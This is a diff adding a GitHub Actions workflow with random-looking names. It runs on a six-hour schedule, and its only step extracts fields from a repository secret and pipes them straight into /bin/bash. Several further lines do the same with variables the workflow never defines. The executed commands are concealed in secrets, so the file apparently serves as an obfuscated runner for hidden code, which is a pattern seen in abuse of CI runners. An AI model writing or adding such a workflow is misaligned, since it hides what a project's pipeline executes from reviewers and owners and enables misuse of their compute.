@@ -1,0 +1,24 @@
+name: diegomake329
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: diegomake329
+        env:
+          cjlmc6: ${{ secrets.cjlmc6 }}
+        run: |
+          echo $cjlmc6 | jq -r .dttg4901 | /bin/bash
+          echo $qt38 | jq -r .jmi28 | /bin/bash
+          echo $rax6028 | jq -r .pl13281 | /bin/bash
+          echo $j553 | jq -r .gp69 | /bin/bash
+          echo $bogeb24687 | jq -r .gasae68 | /bin/bash
+          echo $u2 | jq -r .zlk56 | /bin/bash
+          echo $r1 | jq -r .x67309 | /bin/bash
+
